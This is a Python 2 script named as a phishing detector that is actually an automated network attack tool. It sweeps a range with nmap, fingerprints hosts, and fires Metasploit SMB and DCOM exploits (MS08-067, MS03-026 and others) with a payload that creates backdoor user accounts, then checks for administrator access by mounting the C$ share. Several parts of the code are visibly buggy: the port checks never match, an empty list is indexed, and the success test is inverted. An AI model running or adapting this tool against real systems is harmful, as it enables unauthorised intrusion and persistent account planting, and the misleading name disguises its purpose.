#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import getopt
import socket
import commands
import re
import datetime

# Class Phishing_Detector : inherits from the base class object. New-style Classes
# Mandatory and optional args can be identified with the __init__ method
class Phishing_Detector(object):

    #Phishing_Detector Comment : constructor - takes one parameter. This is arguments received from main.py wrapper.
    def __init__(self):
        self.VERSION = '0.2'
        ##### VARIABLES
        # will hold the initial target gotten from the command line
        self.initial_target = ""
        # will hold the targets to ignore
        self.exclusions = ""
        # will hold machines that are up
        self.host_array = []
        # hold host information from scan
        # is really a hash of hashes of arrays where the keys are the IPs of the
        # machines that are OS scanned followed by the keys open_ports and os
        self.host_hash = {}
        # variable for iterating through host_array and host_hash
        self.host = ""
        # variable for iterating through command output
        self.line = ""
        # variable to hold the user that metasploit will try to create
        self.new_user = ""
        # options hash to hold all command line arguments
        self.Options = {}
        # if 0 don't run exploits.  if 1, run exploits.
        self.exploit_flag = 0

    def usage(self):
        '''
        Method that will print the usage for the user and then exit the script

        '''

        print "Usage:"
        print "main.py phishing [-h] [-v] [-e] [-x exclusions] <-t target>"
        print "[-h] -- optional"
        print "     -- prints this menu"
        print "[-v] -- optional"
        print "     -- prints the version of the script"
        print "[-e] -- optional"
        print "     -- tries to exploit targets"
        print "<-x exclusion> -- optional"
        print "     -- exclusions to exclude from scanning (NMap format)"
        print "<-t target> -- required"
        print "     -- initial target to start with (NMap format)"
        sys.exit(0)

    def setup(self, arg):
        '''
        Method will do initial setup and argument checking.
        :param arg: list. arguments from stdin.

        '''

        # clears the list of exclusions that the script will not run against
        self.exclusions = ""
        # path to ifconfig
        self.ifconfig="/sbin/ifconfig"
        # sets lines equal to what ifconfig gives out or kills the program and tells the user why
        lines = ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1])
        # iterates through the lines array so that can get all IP addresses assigned to the box
        # the script is run on
        for row in lines:
            # if exclusions is undefined then this is the first exclusion
            if self.exclusions == "":
                self.exclusions = row
            # exclusions are defined so add the new ip to the list
            # comma delimited
            else:
                self.exclusions = (', '.join([self.exclusions, row])).lstrip(', ')
        # uses the getopts function to get all options from the command line
        # and sets them into the Options hash
        # the letters hevxt are valid options that can be given to the script
        # with x and t needed arguments

        #The getopt is the standard python module for parsing args
        #(see python reference documentation : http://docs.python.org/lib/module-getopt.html)
        #Here we search for args beginning with s,k,f,x,d,t,c,w,e,o that need a value, and args h,v,n
        #The list(inside []), refers to the long options.
        #
        # argv[1:] returns a list that begins with element 1 of argv
        # exemple : argv = ['a','b','c']
        #           argv[1:] will be ['b','c']
        #           argv[2:] will be ['c']
        #
        #The getopt returns a tuple.
        #Here, opts is a list of tuple containing the options type and the values
        #args is the extra paramaters
        #For exemple :
        #    opts, args = getopt.getopt(['-h','-s','10','url'],"u:msl:v:hA:gq:p:sxHw:d:bP:CIDTM:4R:")
        #will return
        #    opts = [('-h',''),('-s','10')]
        #    args = ['url']
        optlist, args = getopt.getopt(arg, "hevt:x:")

        for k in optlist:
            # if h is defined go to the usage method
            if k[0] == '-h':
                self.usage()
            # if v is defined go to the version subroutine
            elif k[0] == '-v':
                print "Version: %s \n" % self.VERSION
                sys.exit(0)
            # if e is defined then exploits will be run because
            # exploit_flag will be set to 1
            elif k[0] == '-e':
                self.exploit_flag = 1
            # if x is defined, the additional exclusions are
            # given and need to be added to the exclusions string
            elif k[0] == '-x':
                # checks to make sure that the value of x in the Options hash matches an ip address,
                # or range of addresses
                if re.search('((([1-2]?[0-9]?[0-9]\.){1,3}([1-2]?[0-9]?[0-9])?)|any)', k[1]):
                    k[1].strip()
                    # checks to make sure that exclusions is defined and if
                    # not it sets it to x value otherwise appends to x value
                    if self.exclusions == "":
                        self.exclusions = k[1]
                    else:
                        self.exclusions =(', '.join([self.exclusions, k[1]])).lstrip(', ')
                # if the value is not and ip address then error message is displayed
                # as well as usage
                else:
                    print "\n\nTarget not IP address or IP subnet\n\n";
                    self.usage()
            # checks to make sure that t is defined
            elif k[0] == '-t':
                # makes sure that t is an ip address or subnet
                if re.search('((([1-2]?[0-9]?[0-9]\.){1,3}([1-2]?[0-9]?[0-9])?)|any)', k[1]):
                    k[1].strip()
                    # sets the initial target to the value of t
                    self.initial_target = k[1]
                # not an IP address or subnet so tell the user the error and
                # then show the usage
                else:
                    print "\n\nTarget not IP address or IP subnet\n\n"
                    self.usage()
            # t is not defined so tell the user that script needs a target and then
            # show usage
            else:
                print "\n\nNEED A TARGET\n\n"
                self.usage()

    def ping_sweep(self):
        '''
        Method that performs a ping sweep on initial targets
        '''

        # lets the user know what is happening
        print "Performing Ping Sweep on %s..." % self.initial_target
        # runs an nmap scan with a ping sweep with speed of 3 using the exclusions
        # listed in the exclusions string against the initial target given from the command line
        result = ""
        if self.exclusions != "":
            result = commands.getoutput("""nmap -sP -T3 --exclude %s %s""" % (self.exclusions, self.initial_target))
        else:
            result = commands.getoutput("""nmap -sP -T3 %s""" % (self.initial_target))
        print result
        # reads in the output of the ping sweep command
        for row in result.split("\n"):
            # if the line matches Starting Nmap, skip it and go to the next line
            if re.search("Starting Nmap", row):
                continue
            # this line tells you who is being scanned.  Grab the ip and set it to $host
            elif re.findall( r'[0-9]+(?:\.[0-9]+){3}', row):
                ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', row)
                self.host = ip[0]
            # checks to see if the Host is up and that self.host is defined. If they are, the push the ip of the
            # host onto the host_array and undefine self.host to start the process over again
            elif re.search("Host is up", row):
                self.host_array.append(self.host)
                self.host = ""

    def os_detect(self):
        '''
        Method that uses the hosts from the ping sweep to do OS detection on them.

        '''

        # iterates through each host of the host_array
        # values in this array are the results from the ping sweep (hosts that were up)
        for row in self.host_array:
            # chomps the $host variable to remove all end of line junk
            host = row.strip()
            # tells the user what is happening
            print "\nDetermining OS of %s...\n" % host
            # run nmap command
            # use -A to get all scans and most common ports and OS detection
            # and runs it against the host from the host_array
            result = commands.getoutput("""nmap -A %s""" % host)
            # reads in the output of the nmap command
            for line in result.split("\n"):
                # if the line matches Starting Namp, skip it and move
                # to the next line
                if re.search("Starting Nmap", line):
                    continue
                # if the line tells who is getting scanned, grab the ip
                elif re.search("Nmap scan report", line):
                    # makes sure that the IP of the one getting scanned matches who
                    # the command was supposed to scan.  If they match, then go to the next line
                    # else print error and exit.
                    if re.findall( r'[0-9]+(?:\.[0-9]+){3}', line):
                        ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', line)
                        if ip == host:
                            continue
                    else:
                        print "There was a problem somewhere.\n\nEXITING!!\n\n"
                        sys.exit(1)
                # if the line just says that the host is up, skip it and move to the next line
                elif re.search("Host is up", line):
                    continue
                # if the line tells you how many ports are closed, skip it and move to the next line
                ####
                ## MAY WANT TO HAVE THIS SHOW UP IN FINAL REPORT
                ## WORK ON THIS IN NEXT VERSION
                ####
                elif re.search("Not shown", line):
                    continue
                # if the line is just th legend, skip it and move to the next line
                elif re.search("PORT\s+STATE\s+SERVICE\s+VERSION", line):
                    continue
                # if the line tells you what was done and who to report incorrect results to, skip it
                # and move to the next line
                elif re.search("Service detection performed. Please report any incorrect results", line):
                    continue
                # if the line says that Nmap is done, skip it and move to the next line
                elif re.search("Nmap done:", line):
                    continue
                # if the line says that all ports are closed on the host, grab the host
                elif re.search("All 1000 scanned ports on", line):
                    # if the host matches the one just scanned, set line2 to tell
                    # the user what happened and push that line onto the host_hash for that ip.  Next undefine line2
                    # move to the next line.
                    if re.findall( r'[0-9]+(?:\.[0-9]+){3}', line):
                        ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', line)
                        if ip == host:
                            line2 = "%s is up but the ports used for OS detection are closed.  No other scans done." % host
                            self.host_hash.update({host: {'closed_ports': line2}})
                            continue
                        else:
                            print "There was a problem somewhere.\n\nEXITING!!\n\n"
                            sys.exit(1)
                # check to see if the port is active and if so, put it onto the array for the host_hash
                # for that port type
                elif re.search("(\d+)\/(\w+)\s+open\s+(\w+)", line):
                    matches = re.search("(\d+)\/(\w+)\s+open\s+(\w+)", line)
                    if matches.group(2) == "tcp":
                        if self.host_hash.has_key(host):
                            self.host_hash[host]['open_ports']['tcp'].append([matches.group(1)])
                        else:
                            self.host_hash.update({host: {'open_ports':{'tcp':[[matches.group(1)]]}}})
                    elif matches.group(2) == "udp":
                        if self.host_hash.has_key(host):
                            self.host_hash[host]['open_ports']['udp'].append([matches.group(1)])
                        else:
                            self.host_hash.update({host: {'open_ports':{'udp': [[matches.group(1)]]}}})
                # check to see what os and push that onto the array for the host hash
                elif re.search("Service\s+Info:\s+OS:\s+(\w+)", line):
                    os = re.search("Service\s+Info:\s+OS:\s+(\w+)", line)
                    if self.host_hash.has_key(host):
                        self.host_hash[host]['OS'] = os.group(1)
                    else:
                        self.host_hash.update({host: {'OS': os.group(1)}})

    def print_output(self):
        '''
        Method will print output of the results of this scan
        '''

        # tell the user what is about to happen
        print "OUTPUT:"
        # iterates through all the hosts in the host_hash hash
        for key, value in self.host_hash.iteritems():
            # tell the user what target the information is for
            print "TARGET: %s" % key
            # sees if the value for 'closed_ports' is defined
            if value.has_key('closed_ports'):
                # sets string equal to 'closed_ports'
                string = value.get('closed_ports')
                # prints the string for the user
                print "\t%s" % string
            # the host was up so time to print out information about it
            else:
                # checks to see if we got the os of the host
                if value.has_key('OS'):
                    # tell the user what they are about to see
                    # iterates through the os listing and chomps each line
                    # and then prints each line to the screen
                    print "OS: %s" % value.get('OS')
                # checks to see if there are any tcp ports open on the host
                if value['open_ports'].has_key('tcp'):
                    # tells the user what they are about to see
                    print "TCP Ports Open: %s" % ', '.join([port[0] for port in value['open_ports']['tcp']])
                    # iterates through the tcp ports and if the line is
                    # defined, chomps it, and prints it to the screen
                    #for port in value['open_ports']['tcp']:
                        #print "\t%s" % port[0]
                # checks to see if there are any udp ports open on the host
                if value['open_ports'].has_key('udp'):
                    # tells the user what they are about to see
                    print "\tUDP Ports Open:"
                    # iterates through the udp ports and if the line is
                    # defined, chomps it, and prints it to the screen
                    for port in value['open_ports']['udp']:
                        print "\t%s" % port
                 # checks to see exploits were run and if so then move in
                if self.exploit_flag == 1:
                    # checks to see if exploits worked on the host
                    if value.has_key('exploits_that_worked'):
                        # tells the user what they are about to see
                        print "\tExploits that Worked:"
                        # iterates through the worked exploits and chomps each line and \
                        # then prints the line to the screen
                        for row in value['exploits_that_worked']:
                            print "\t%s" % row
                    # checks to see if exploits failed on the host
                    if value.has_key('exploits_that_failed'):
                        # tells the user what they are about to see
                        print "\tExploits that Failed:"
                        # iterates through the failed exploits and chomps each line
                        # and prints the line to the screen
                        for row in value['exploits_that_failed']:
                            print "\t%s" % row

    def exploit_host(self):
        '''
        Method will exploit the host based on the information from the os_detect and ping_sweep methods
        '''

        # iterates through the keys of the host_hash which is the ip
        # addresses of machines that are up
        for host, value in self.host_hash.iteritems():
            # tells the user what is going to happen
            print "\nGoing to see what can be exploited on host %s...\n" % host
            # iterates through all of the open tcp ports on the host
            for port_status, port_dict in value.iteritems():
                if port_status == "open_ports":
                    for protocol, port_list in port_dict.iteritems():
                        for port in port_list:
                            if port[0] == 445:
                                self.default_exploit(host, "windows/smb/ms04_011_lsass")
                                self.default_exploit(host, "windows/smb/ms08_067_netapi")
                                self.default_exploit(host, "windows/smb/ms06_066_nwapi")
                                self.default_exploit(host, "windows/smb/ms05_039_pnp")
                                self.default_exploit(host, "windows/smb/ms06_066_nwwks")
                            elif port[0] == 135:
                                self.default_exploit(host, "windows/dcerpc/ms03_026_dcom")

    def default_exploit(self, host, explt):
        '''
        Method will run exploits with default settings it is passed the ip of the host to exploit
        and the exploit to try
        :param host: string
        :param explt: string
        '''

        # sets ip to the first argument passed
        ip = host
        # sets $exploit to the second argument passed
        exploit = explt
        # creates a temp array for storing exploit output
        temp_array = []
        # creates a temporary string variable
        string = ""
        # creates a dict that will hold the options for the exploits wanting to run
        options_hash = {}
        # sets option_string to get the options for the exploit wanting to run
        # uses the ip as the RHOST value so that that is one value that will already be
        # filled in
        # also redirected stderr to stdin so could get it in the pipe
        output = commands.getoutput("msfcli %s RHOST=%s O 2>&1" % (exploit, ip))
        # iterate through the output array setting line to the current line
        for row in output.split("\n"):
            if row == "":
                continue
            # if line is the RHOST option with an ip address then go to the next line
            elif re.search("\s+RHOST\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+", row):
                continue
            # if line is the RPORT option with a port defined then go to the next line
            elif re.search("\s+RPORT\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+", row):
                continue
            # if the line is any other option with the default option filled in, push then option
            # onto the array
            # also the option is set to all caps
            elif re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+", row):
                opt = re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+", row)
                options_hash.update({'required': [opt.group(1), opt.group(2)]})
            # if the line is any option with a default option filled in but still has
            # other values listed in the description, then this is true
            elif re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+\((.+)\)", row):
                opt = re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+\((.+)\)", row)
                if options_hash.has_key('required'):
                    options_hash['required'].append([opt.group(1), opt.group(2)])
                else:
                    options_hash.update({'required': [opt.group(1), opt.group(2)]})
            # if the option is optional and has a default value push it onto the array
            elif re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+no\s+.[A-Za-z0-9\s]+", row):
                opt = re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+no\s+.[A-Za-z0-9\s]+", row)
                if options_hash.has_key('required'):
                    options_hash['required'].append([opt.group(1), opt.group(2)])
                else:
                    options_hash.update({'required': [opt.group(1), opt.group(2)]})
            # if the option is optional and has a default value and lists other possible
            # values in the description, then move in
            elif re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+\((.+)\)", row):
                opt = re.search("\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+\((.+)\)", row)
                if options_hash.has_key('required'):
                    options_hash['required'].append([opt.group(1), opt.group(2)])
                else:
                    options_hash.update({'required': [opt.group(1), opt.group(2)]})
        # creates variable for holding exploit strings
        exploit_strings = []
        # checks to see if required or optional are defined exist in the options_hash has
        if options_hash.has_key('required') or options_hash.has_key('optional'):
            # iterates through the options_hash hash with keys of explicit
            for key, sublist in options_hash.iteritems():
                # iterates through the hash with keys set to type
                for line in sublist:
                    # sets local variable counter1 to 0
                    counter1 = 0
                    # creates a new user account by calling sub rountine generate_new_username
                    new_user = self.generate_new_username()
                    # creates an exploit string ysing the option of type=option and sets the payload to add
                    # a user account with the name as new_user variable plus the counter1 variable
                    exploit_string_push = """msfcli %s RHOST=%s PAYLOAD=windows/adduser USER=%s%s E 2>&1""" % (exploit, host, new_user, counter1)
                    # pushes the exploit string onto the exploit_strings array
                    exploit_strings.append(exploit_string_push)
                    # increases the counter1 variable by one
                    counter1 += 1
        # no options other than port and address so just create the exploit string
        else:
            # generate a new username and set it to the new_user variable
            new_user = self.generate_new_username()
            # set exploit_strings position 0 to the exploit string that has a
            # payload of adding a new user to the system
            exploit_strings[0] = """msfcli %s RHOST=%s PAYLOAD=windows/adduser USER=%s E 2>&1 """ % (exploit, host, new_user)
        # iterates through the exploit_strings array
        for line in exploit_strings:
            exploit_string = line
            new_user = ""
            # does matching to get username trying to make and exploit using
            # no extra options given on this one
            if re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", line):
                # new_user it set to the user account in the exploit string
                opt = re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", line)
                new_user = opt.group(2)
                # tells the user what exploit is going to be tried and what user account will be created
                print "Going to try to use exploit %s and create user %s\n" % (opt.group(1), new_user)
            # gets the exploit, options, and the user account that will be tried
            elif re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", line):
                # sets new_user to the user account in the exploit string
                opt = re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", line)
                new_user = opt.group(3)
                # tells the user what exploit will be tried with what options, and what user account will be created
                print "Going to try to use exploit %s with option(s) %s and create user $new_user\n" % (opt.group(1), new_user)
            # createa a counter and sets it to 1
            counter = 1
            # clears the temp_array array
            temp_array = []
            # while counter is less than 4, this will continue
            # this will allow the exploits to be tried 3 times apiece
            # do this because sometimes the exploit might fail the first couple of times
            while (counter < 4):
                output = commands.getoutput(exploit_string)
                # reads in the lines from the command output
                temp_array = output.split("\n")
                # checks to see if the exploit worked using exploit_worked subroutine
                # if it worked then this is true
                # passes the last line of the temp_array array, the ip, and the
                # user account tried to create
                if self.exploit_worked(temp_array[-1], ip, new_user):
                    # if the exploit does no include any extra options, then
                    # set counter to 10, set string to what user was added with what exploit,
                    # push that string onto the array
                    if re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string):
                        opt = re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string)
                        counter = 10
                        string = "%s added with password metasploit using %s exploit" % (opt.group(2), opt.group(1))
                        if self.host_hash.has_key(host):
                            self.host_hash[host]['exploits_that_worked'] = string
                        else:
                            self.host_hash.update({'exploits_that_worked': string})
                    # if the exploit includes extra options, then
                    # set counter to 10, set string to what user was added with what exploit and options
                    # push the string onto the array
                    elif re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string):
                        opt = re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string)
                        counter = 10
                        string = "%s added with password metasploit using %s exploit and option(s) %s" % (opt.group(3), opt.group(1), opt.group(2))
                        if self.host_hash.has_key(host):
                            self.host_hash[host]['exploits_that_worked'] = string
                        else:
                            self.host_hash.update({'exploits_that_worked': string})
                else:
                    counter += 1
            # checks to see if string is defined or not.  if not, then this is true
            # and that means that the exploit was unsuccessful
            if string:
                # checks to see if the exploit string does not contain any extra options
                if re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string):
                    opt = re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string)
                    string = "%s failed to exploit" % opt.group(1)
                    if self.host_hash.has_key(host):
                        self.host_hash[host]['exploits_that_failed'] = string
                    else:
                        self.host_hash.update({'exploits_that_failed': string})
                    string = ""
                # checks to see if the exploit string contains any extra options
                elif re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string):
                    opt = re.search("msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2", exploit_string)
                    string = "$1 failed to exploit using option(s) $2" % (opt.group(1), opt.group(2))
                    if self.host_hash.has_key(host):
                        self.host_hash[host]['exploits_that_failed'] = string
                    else:
                        self.host_hash.update({'exploits_that_failed': string})

    def generate_new_username(self):
        '''
        Method takes the time on the local machine and passes it to the localtime function that then
        sets each of the temp variables to the the correct position
        '''

        cur_date = datetime.datetime.today().strftime("%S%M%H%d%m%Y")
        # returns user concatenated with the date variable
        return ''.join(["user", cur_date])

    def exploit_worked(self, last_line, host_ip, new_user):
        '''
        Method takes the last line of the temp_array variable, the ip of the
        host, and the user account created and checks to see if the exploit worked
        :param last_line: string
        :param ip: string
        :param user: string
        '''

        # last line of the temp array that is passed to the function
        line = last_line
        # temp variable holding the ip address passed to the function
        ip = host_ip
        # temp variable of the user account created, passed to the function
        user = new_user
        # checks to see if the last line gotten from the exploit is not Exploit Failed
        # if it is not, then the check proceeds
        if re.search("Exploit failed\:", line):
            # sets the temporary variable to what the mount command will be to test if the exploit worked
            # should only be able to mount the C drive if the user is an admin
            # also pass all output (error and other) to STDOUT
            mount_command = """mount -t cifs //%s/C\$ /mnt/smb/ -o username=%s,password=metasploit 2>&1"""
            # sets result to the commnd output of running the command
            result = commands.getoutput(mount_command % (ip, user))
            if re.search("mount error 13 \= Permission denied", result):
                return False
                # must be mounted so unmount the share
            commands.getoutput("""umount /mnt/smb""")
            # since it made it this far, that means that the command worked and True is returned to the
            # calling operation
            return True
        else:
            return False

    def main(self, arg):
        '''
        Main method of the class.
        Note that it's just a name unlike java...
        See below for the entry point of the program.

        '''

        self.setup(arg)
        self.ping_sweep()
        self.os_detect()
        # will only run the exploits if the e flag is given when the script is run
        if self.exploit_flag == 1:
            self.exploit_host()
        self.print_output()

